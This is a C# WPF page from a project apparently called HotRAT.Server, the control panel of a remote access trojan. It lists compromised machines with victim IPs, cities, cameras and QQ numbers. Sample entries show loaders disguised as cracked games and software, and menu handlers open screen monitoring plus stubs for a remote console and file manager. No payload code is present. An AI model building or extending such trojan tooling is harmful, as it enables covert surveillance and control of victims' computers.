using Data;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace HotRAT.Server.Pages
{
    /// <summary>
    /// ClientList.xaml 的交互逻辑
    /// </summary>
    public partial class ClientList : Page
    {
        public static iNKORE.UI.WPF.Modern.Controls.ListView lv { get; set; }
        public static ObservableCollection<Device> DeviceL { get; set; } = new ObservableCollection<Device>();
        public ClientList()
        {
            InitializeComponent();
            lv = listViewDevices;
            this.Loaded += (_, _) =>
            {
                if (false)
                {
                    DeviceL.Clear();
                    DeviceL.Add(new Device()
                    {
                        DeviceName = "PC",
                        UserName = "Administrator",
                        IP = "192.168.1.10",
                        City = "上海",
                        CameraDevice = "Display Camera 2.0",
                        InstallTime = "2024-7-16",
                        LoaderName = "植物大战僵尸杂交版.exe",
                        QQNumber = "10001",
                        ProcessID = "8310",
                        XY = "[100,100]"
                    });
                    DeviceL.Add(new Device()
                    {
                        DeviceName = "Surface Book",
                        UserName = "Administrator",
                        IP = "192.168.1.9",
                        City = "陕西 西安",
                        CameraDevice = "USB 3.0 Camera",
                        InstallTime = "2024-7-16",
                        LoaderName = "QQ破解版.exe",
                        QQNumber = "2077576874",
                        ProcessID = "5232",
                        XY = "[100,100]"
                    });
                    DeviceL.Add(new Device()
                    {
                        DeviceName = "Lenovo XiaoXin",
                        UserName = "Lenovo",
                        IP = "192.168.1.8",
                        City = "广东 河源",
                        CameraDevice = "USB 3.0 Camera",
                        InstallTime = "2024-7-16",
                        LoaderName = "VapeV4.exe",
                        QQNumber = "2431798772",
                        ProcessID = "4124",
                        XY = "[100,100]"
                    });
                }
                listViewDevices.ItemsSource = DeviceL;
                listViewDevices.Items.Refresh();
            };
        }
        #region 右键菜单操作
        private void MenuItem_Offline_Click(object sender, RoutedEventArgs e)
        {
            if (MainData.SelectDevice == null) return;
            // 获取选中的 Device 项
            if (listViewDevices.SelectedItem is Device selectedDevice)
            {
                // 删除选中项
                DeviceL.Remove(selectedDevice);
            }
        }

        private void MenuItem_ScreenMonitor_Click(object sender, RoutedEventArgs e)
        {
            if (MainData.SelectDevice == null) return;
            Windows.ScreenMonitor screen = new();
            screen.Show();
        }

        private async void MenuItem_Console_Click(object sender, RoutedEventArgs e)
        {
            if (MainData.SelectDevice == null) return;

        }

        private void MenuItem_FileManager_Click(object sender, RoutedEventArgs e)
        {
            if (MainData.SelectDevice == null) return;
        }

        private void MenuItem_Alert_Click(object sender, RoutedEventArgs e)
        {
            if (MainData.SelectDevice == null) return;
        }

        #endregion
        public static void DeleteDeviceByIP(string ipToRemove)
        {
            var deviceToRemove = DeviceL.FirstOrDefault(d => d.IP == ipToRemove);
            if (deviceToRemove != null)
            {
                if (MainData.SelectDevice == deviceToRemove) MainData.SelectDevice = null;
                DeviceL.Remove(deviceToRemove);
            }
        }

        private void listViewDevices_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (listViewDevices.SelectedItem != null)
            {
                MainData.SelectDevice = (Device)listViewDevices.SelectedItem;
            }
        }
    }
}
